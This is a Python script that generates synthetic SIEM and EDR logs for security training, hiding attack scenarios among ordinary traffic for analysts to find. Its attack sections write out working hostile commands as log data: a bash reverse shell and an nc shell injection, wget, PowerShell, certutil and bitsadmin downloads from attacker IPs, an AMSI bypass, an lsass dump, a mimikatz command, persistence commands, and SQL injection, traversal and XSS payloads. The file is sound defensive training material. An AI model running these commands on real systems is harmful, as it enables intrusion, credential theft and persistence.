#!/usr/bin/env python3
"""
Egitim amacli sentetik SIEM log ureteci.
Normal trafik (gurultu) + icine gomulu, bulunabilir atak senaryolari (sinyal).
Cikti: kronolojik sirali, heterojen kaynakli (syslog header + native message) ~20k satir.
Hersey sentetiktir; gercek sistem/kisi/veri yoktur.
"""
import random
import datetime as dt

random.seed(1337)

# --------------------------------------------------------------------------
# Ortam tanimlari
# --------------------------------------------------------------------------
HOSTS = ["web01", "web02", "app01", "db01", "dc01", "fw01", "mail01", "jump01"]
NORMAL_USERS = ["caner", "ayse", "mehmet", "zeynep", "it_admin", "backup", "deploy", "nagios"]
INTERNAL_NET = "10.10."
# Normal (meşru) dış ziyaretçi IP'leri
BENIGN_IPS = [f"88.{random.randint(230,255)}.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(40)]
UA_NORMAL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0 Safari/537.36",
]
BENIGN_PATHS = ["/", "/index.html", "/about", "/products", "/products/42", "/cart", "/api/v1/status",
                "/api/v1/user/profile", "/static/app.css", "/static/app.js", "/images/logo.png",
                "/search?q=ayakkabi", "/login", "/checkout", "/blog/2026/security-tips"]

# Atakci IP'leri (senaryolarda tekrar kullanilir)
ATK = {
    "ssh_bruteforce": "185.220.101.47",      # Tor-ish
    "sqli":           "45.33.22.18",
    "lfi":            "103.76.228.9",
    "portscan":       "193.27.14.201",
    "cmdinj":         "159.203.44.77",
    "dns_tunnel":     "91.219.236.14",
    "winbrute":       "212.102.63.5",
    "exfil_dst":      "5.188.206.19",         # cikis exfil hedefi
    "impossible_a":   "78.40.125.9",          # TR
    "impossible_b":   "198.51.100.23",        # US (ayni kullanici, dk farkla)
}

lines = []  # (datetime, text)

def ts(d):
    return d.strftime("%Y-%m-%dT%H:%M:%S+03:00")

def add(d, host, prog, msg):
    lines.append((d, f"{ts(d)} {host} {prog}: {msg}"))

START = dt.datetime(2026, 10, 12, 0, 0, 0)

# --------------------------------------------------------------------------
# BASELINE GURULTU  (~ coğunluk)
# --------------------------------------------------------------------------
def rand_time(day_offset_max=3):
    base = START + dt.timedelta(seconds=random.randint(0, day_offset_max * 86400))
    return base

# nginx access (normal)
for _ in range(11350):
    d = rand_time()
    ip = random.choice(BENIGN_IPS)
    path = random.choice(BENIGN_PATHS)
    code = random.choices([200, 200, 200, 304, 302, 404, 500], weights=[60,15,10,5,5,4,1])[0]
    size = random.randint(180, 48000)
    ua = random.choice(UA_NORMAL)
    meth = "POST" if path in ("/login", "/checkout") else "GET"
    host = random.choice(["web01", "web02"])
    add(d, host, "nginx",
        f'{ip} - - "{meth} {path} HTTP/1.1" {code} {size} "-" "{ua}"')

# sshd normal oturumlar
for _ in range(1500):
    d = rand_time()
    u = random.choice(NORMAL_USERS)
    ip = f"{INTERNAL_NET}{random.randint(1,4)}.{random.randint(10,200)}"
    host = random.choice(["jump01", "app01", "db01"])
    add(d, host, "sshd[%d]" % random.randint(1000, 60000),
        f"Accepted publickey for {u} from {ip} port {random.randint(40000,65000)} ssh2: ED25519 SHA256:xx")

# firewall allow (normal)
for _ in range(3000):
    d = rand_time()
    src = random.choice(BENIGN_IPS)
    host = "fw01"
    add(d, host, "kernel",
        f"[FW ALLOW] IN=eth0 OUT= SRC={src} DST=203.0.113.10 PROTO=TCP SPT={random.randint(1024,65000)} DPT={random.choice([80,443])}")

# windows normal logon (4624)
for _ in range(1200):
    d = rand_time()
    u = random.choice(NORMAL_USERS)
    add(d, "dc01", "Microsoft-Windows-Security-Auditing",
        f"EventID=4624 LogonType=3 Account={u} Source={INTERNAL_NET}5.{random.randint(10,200)} Status=Success")

# normal DNS
for _ in range(1500):
    d = rand_time()
    dom = random.choice(["google.com", "github.com", "update.microsoft.com", "cdn.jsdelivr.net", "ntp.pool.org"])
    add(d, "dc01", "named",
        f"query: {dom} IN A client {INTERNAL_NET}5.{random.randint(10,200)}")

# --------------------------------------------------------------------------
# ATAK SENARYOLARI (sinyal)
# --------------------------------------------------------------------------

# 1) SSH brute-force -> basarili compromise (admin)
bf_start = START + dt.timedelta(days=1, hours=2, minutes=14)
ip = ATK["ssh_bruteforce"]
users = ["root", "admin", "oracle", "postgres", "test", "ubuntu", "admin", "admin"]
for i in range(240):
    d = bf_start + dt.timedelta(seconds=i * 7 + random.randint(0, 3))
    u = random.choice(users)
    inv = "Invalid user " if u in ("oracle", "test") else ""
    add(d, "jump01", "sshd[%d]" % random.randint(1000, 60000),
        f"Failed password for {inv}{u} from {ip} port {random.randint(40000,65000)} ssh2")
# basarili giris (compromise anı)
d_comp = bf_start + dt.timedelta(seconds=240 * 7 + 5)
add(d_comp, "jump01", "sshd[12345]",
    f"Accepted password for admin from {ip} port 51844 ssh2")
add(d_comp + dt.timedelta(seconds=2), "jump01", "sshd[12345]",
    f"pam_unix(sshd:session): session opened for user admin by (uid=0)")
# compromise sonrasi: sudo + suspicious komutlar
add(d_comp + dt.timedelta(seconds=30), "jump01", "sudo",
    "admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/cat /etc/shadow")
add(d_comp + dt.timedelta(seconds=45), "jump01", "auditd",
    f"type=EXECVE argc=3 a0=\"wget\" a1=\"http://{ATK['exfil_dst']}/x\" a2=\"-O/tmp/.s\"")
add(d_comp + dt.timedelta(seconds=60), "jump01", "auditd",
    "type=EXECVE argc=2 a0=\"chmod\" a1=\"+x\" a2=\"/tmp/.s\"")

# 2) SQLi kampanyasi (sqlmap UA)
sq_start = START + dt.timedelta(days=1, hours=9, minutes=3)
ip = ATK["sqli"]
sqli_payloads = [
    "/login?user=admin'--",
    "/search?q=1'%20OR%20'1'='1",
    "/search?q=1%20UNION%20SELECT%20username,password%20FROM%20users--",
    "/product?id=1;DROP%20TABLE%20users--",
    "/search?q=1'%20AND%20SLEEP(5)--",
    "/api/v1/user?id=1%20OR%201=1",
]
for i in range(180):
    d = sq_start + dt.timedelta(seconds=i * 4 + random.randint(0, 2))
    p = random.choice(sqli_payloads)
    code = random.choices([200, 500, 403], weights=[5, 3, 2])[0]
    add(d, "web01", "nginx",
        f'{ip} - - "GET {p} HTTP/1.1" {code} {random.randint(200,9000)} "-" "sqlmap/1.7.11#stable (https://sqlmap.org)"')

# 3) LFI / path traversal + scanner (nikto)
lfi_start = START + dt.timedelta(days=2, hours=1, minutes=22)
ip = ATK["lfi"]
lfi_paths = [
    "/download?file=../../../../etc/passwd",
    "/view?page=....//....//....//etc/passwd",
    "/index.php?lang=../../../../etc/shadow%00",
    "/admin/config.php.bak",
    "/.git/config", "/.env", "/wp-login.php", "/phpmyadmin/",
]
for i in range(150):
    d = lfi_start + dt.timedelta(seconds=i * 5)
    p = random.choice(lfi_paths)
    code = random.choices([404, 403, 200], weights=[6, 3, 1])[0]
    add(d, "web02", "nginx",
        f'{ip} - - "GET {p} HTTP/1.1" {code} {random.randint(150,3000)} "-" "Mozilla/5.00 (Nikto/2.5.0)"')

# 4) XSS probleri
xss_start = START + dt.timedelta(days=2, hours=4)
for i in range(60):
    d = xss_start + dt.timedelta(seconds=i * 11)
    p = random.choice([
        "/search?q=<script>alert(1)</script>",
        "/comment?text=<img%20src=x%20onerror=alert(document.cookie)>",
        "/profile?name=\"><svg/onload=fetch('//evil')>",
    ])
    add(d, "web01", "nginx",
        f'{ATK["sqli"]} - - "GET {p} HTTP/1.1" 200 {random.randint(200,1200)} "-" "Mozilla/5.0"')

# 5) Port scan (firewall DROP, ardisik portlar)
ps_start = START + dt.timedelta(days=0, hours=22, minutes=41)
ip = ATK["portscan"]
for i in range(400):
    d = ps_start + dt.timedelta(milliseconds=i * 180)
    dpt = 1 + i  # ardisik -> SYN scan imzasi
    add(d, "fw01", "kernel",
        f"[FW DROP] IN=eth0 OUT= SRC={ip} DST=203.0.113.10 PROTO=TCP SPT=44321 DPT={dpt} FLAGS=SYN")

# 6) Command injection (cgi-bin / shellshock benzeri)
ci_start = START + dt.timedelta(days=2, hours=7, minutes=15)
ip = ATK["cmdinj"]
for i in range(50):
    d = ci_start + dt.timedelta(seconds=i * 8)
    p = random.choice([
        "/cgi-bin/status?host=127.0.0.1;cat%20/etc/passwd",
        "/ping?ip=8.8.8.8|nc%20-e%20/bin/sh%20{0}%204444".format(ip),
        "/cgi-bin/test.cgi",
    ])
    ua = "() { :; }; /bin/bash -c 'id'" if "test.cgi" in p else "curl/8.4.0"
    add(d, "app01", "nginx",
        f'{ip} - - "GET {p} HTTP/1.1" 200 {random.randint(100,800)} "-" "{ua}"')

# 7) Veri sizdirma (exfil): compromise sonrasi buyuk outbound tek IP'ye
ex_start = d_comp + dt.timedelta(minutes=12)
ip = ATK["exfil_dst"]
for i in range(30):
    d = ex_start + dt.timedelta(seconds=i * 20)
    nbytes = random.randint(40_000_000, 120_000_000)  # 40-120 MB
    add(d, "fw01", "kernel",
        f"[FW ALLOW] IN= OUT=eth0 SRC=10.10.3.55 DST={ip} PROTO=TCP SPT=51999 DPT=443 BYTES={nbytes}")

# 8) DNS tunneling (uzun TXT subdomain'ler, tek domain)
dt_start = START + dt.timedelta(days=2, hours=10)
ip = ATK["dns_tunnel"]
for i in range(220):
    d = dt_start + dt.timedelta(seconds=i * 6)
    sub = "".join(random.choice("abcdef0123456789") for _ in range(45))
    add(d, "dc01", "named",
        f"query: {sub}.exfil-c2.net IN TXT client 10.10.5.88")

# 9) Windows brute-force (4625) -> success (4624) -> special privs (4672)
wb_start = START + dt.timedelta(days=2, hours=13, minutes=5)
ip = ATK["winbrute"]
for i in range(120):
    d = wb_start + dt.timedelta(seconds=i * 6)
    add(d, "dc01", "Microsoft-Windows-Security-Auditing",
        f"EventID=4625 LogonType=3 Account=Administrator Source={ip} Status=Failure SubStatus=0xC000006A")
d_win = wb_start + dt.timedelta(seconds=120 * 6 + 4)
add(d_win, "dc01", "Microsoft-Windows-Security-Auditing",
    f"EventID=4624 LogonType=3 Account=Administrator Source={ip} Status=Success")
add(d_win + dt.timedelta(seconds=1), "dc01", "Microsoft-Windows-Security-Auditing",
    "EventID=4672 Account=Administrator Privileges=SeDebugPrivilege,SeTcbPrivilege")
add(d_win + dt.timedelta(seconds=5), "dc01", "Microsoft-Windows-Security-Auditing",
    "EventID=4688 NewProcess=C:\\Windows\\System32\\cmd.exe Parent=powershell.exe CommandLine=\"whoami /all\"")

# 10) Impossible travel: ayni kullanici, 6 dk arayla TR ve US
it_base = START + dt.timedelta(days=2, hours=16, minutes=0)
add(it_base, "app01", "sshd[22001]",
    f"Accepted password for caner from {ATK['impossible_a']} port 50011 ssh2")  # TR
add(it_base + dt.timedelta(minutes=6), "app01", "sshd[22002]",
    f"Accepted password for caner from {ATK['impossible_b']} port 50022 ssh2")  # US

# 11) Reverse shell / suspicious process (auditd)
rs = START + dt.timedelta(days=2, hours=18, minutes=30)
add(rs, "web02", "auditd",
    f"type=EXECVE argc=5 a0=\"bash\" a1=\"-i\" a2=\">&\" a3=\"/dev/tcp/{ATK['exfil_dst']}/4444\" a4=\"0>&1\"")
add(rs + dt.timedelta(seconds=3), "web02", "auditd",
    "type=EXECVE argc=2 a0=\"python3\" a1=\"-c\" a2=\"import socket,os,pty;...\"")

# --------------------------------------------------------------------------
# EDR (uc nokta) process telemetrisi  —  PowerShell / LOLBin analizi icin
# --------------------------------------------------------------------------
WKS = ["WKSTN-07", "WKSTN-12", "FIN-PC03", "HR-PC09", "DEV-PC21"]
DOM_USERS = ["KAPISTONA\\caner", "KAPISTONA\\ayse", "KAPISTONA\\mehmet",
             "KAPISTONA\\zeynep", "KAPISTONA\\it_admin"]

def sha256():
    return "".join(random.choice("0123456789abcdef") for _ in range(64))

def edr(d, host, user, image, parent, cmd, signed=True, h=None):
    h = h or sha256()
    add(d, host, "edr",
        f'EventType=ProcessCreate User={user} Image={image} Parent={parent} '
        f'Hash={h} Signed={"true" if signed else "false"} CommandLine="{cmd}"')
    return h

# --- normal uc nokta gurultusu (~260 satir) ---
BENIGN_PROC = [
    (r"C:\Program Files\Google\Chrome\Application\chrome.exe", r"explorer.exe",
     r"chrome.exe --type=renderer"),
    (r"C:\Program Files\Microsoft\Teams\current\Teams.exe", r"explorer.exe", r"Teams.exe"),
    (r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", r"explorer.exe", r"OUTLOOK.EXE"),
    (r"C:\Windows\System32\svchost.exe", r"services.exe", r"svchost.exe -k netsvcs"),
    (r"C:\Windows\explorer.exe", r"userinit.exe", r"explorer.exe"),
    (r"C:\Windows\System32\MsMpEng.exe", r"services.exe", r"MsMpEng.exe"),
    (r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"explorer.exe",
     r"powershell.exe Get-Date"),
]
for _ in range(260):
    d = rand_time()
    host = random.choice(WKS)
    user = random.choice(DOM_USERS)
    image, parent, cmd = random.choice(BENIGN_PROC)
    edr(d, host, user, image, parent, cmd, signed=True)

# --- EDR atak zinciri: phishing makro -> indirme -> cred dump -> persistence ---
e0 = START + dt.timedelta(days=2, hours=11, minutes=42)
host, user = "FIN-PC03", "KAPISTONA\\zeynep"
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
b64 = "".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/") for _ in range(220))
mal_hash = sha256()

# 1) Office makrosu PowerShell doguruyor (suspicious parent)
edr(e0, host, user, PS, r"WINWORD.EXE",
    r"powershell.exe -nop -w hidden -enc " + b64, signed=True)
# 2) Encoded komutun cozumu: download cradle
edr(e0 + dt.timedelta(seconds=4), host, user, PS, PS,
    r"powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://" + ATK["exfil_dst"] + r"/a.ps1')",
    signed=True)
# 3) AMSI bypass
edr(e0 + dt.timedelta(seconds=7), host, user, PS, PS,
    r"powershell.exe [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
    signed=True)
# 4) LOLBin ile payload indirme (certutil)
edr(e0 + dt.timedelta(seconds=12), host, user, r"C:\Windows\System32\certutil.exe", PS,
    r"certutil.exe -urlcache -split -f http://" + ATK["exfil_dst"] + r"/p.exe C:\Users\Public\p.exe",
    signed=True)
# 5) Calistirilan payload (imzasiz)
edr(e0 + dt.timedelta(seconds=20), host, user, r"C:\Users\Public\p.exe", PS,
    r"p.exe", signed=False, h=mal_hash)
# 6) Credential dumping (comsvcs.dll MiniDump -> lsass)
edr(e0 + dt.timedelta(seconds=35), host, user, r"C:\Windows\System32\rundll32.exe", r"p.exe",
    r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\lsass.dmp full",
    signed=True)
# 7) Mimikatz benzeri
edr(e0 + dt.timedelta(seconds=50), host, user, r"C:\Users\Public\m.exe", r"p.exe",
    r'm.exe "sekurlsa::logonpasswords" exit', signed=False, h=sha256())
# 8) Persistence: scheduled task + Run key
edr(e0 + dt.timedelta(seconds=70), host, user, r"C:\Windows\System32\schtasks.exe", r"p.exe",
    r"schtasks.exe /create /sc minute /mo 10 /tn Updater /tr C:\Users\Public\p.exe /f", signed=True)
edr(e0 + dt.timedelta(seconds=75), host, user, r"C:\Windows\System32\reg.exe", r"p.exe",
    r"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\Public\p.exe /f",
    signed=True)

# --- ikinci, daha sessiz EDR olayi: webshell (w3wp -> cmd) ---
e1 = START + dt.timedelta(days=1, hours=15, minutes=8)
edr(e1, "WKSTN-12", "NT AUTHORITY\\NETWORK SERVICE", r"C:\Windows\System32\cmd.exe",
    r"w3wp.exe", r"cmd.exe /c whoami & ipconfig /all", signed=True)
edr(e1 + dt.timedelta(seconds=6), "WKSTN-12", "NT AUTHORITY\\NETWORK SERVICE",
    r"C:\Windows\System32\bitsadmin.exe", r"cmd.exe",
    r"bitsadmin /transfer j /download http://" + ATK["cmdinj"] + r"/s.exe C:\Windows\Temp\s.exe",
    signed=True)

# --------------------------------------------------------------------------
# Siralama + yazma
# --------------------------------------------------------------------------
lines.sort(key=lambda x: x[0])
out = "/Users/cf/Kapistona/log/siem_sample.log"
with open(out, "w") as f:
    for _, text in lines:
        f.write(text + "\n")

print(f"Yazildi: {out}")
print(f"Toplam satir: {len(lines)}")
